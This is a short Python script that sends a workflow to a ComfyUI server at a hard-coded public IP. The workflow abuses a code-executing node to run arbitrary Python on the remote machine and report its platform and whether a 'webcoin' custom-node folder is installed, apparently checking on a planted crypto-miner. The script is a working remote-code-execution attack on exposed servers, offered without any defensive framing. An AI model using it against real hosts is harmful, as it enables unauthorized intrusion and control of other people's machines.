"""Probe remote machine platform and webcoin status."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "111.199.97.153"
base = f"http://{ip}:8188"

code = """
import platform, os
lines = []
lines.append('platform=' + platform.system())
cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    pass
if not cn:
    for g in ['/root/ComfyUI/custom_nodes', '/workspace/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break
lines.append('cn=' + str(cn))
if cn:
    wc = os.path.join(cn, 'webcoin')
    lines.append('webcoin_exists=' + str(os.path.isdir(wc)))
    if os.path.isdir(wc):
        lines.append('webcoin_files=' + str(os.listdir(wc)))
result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(8)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
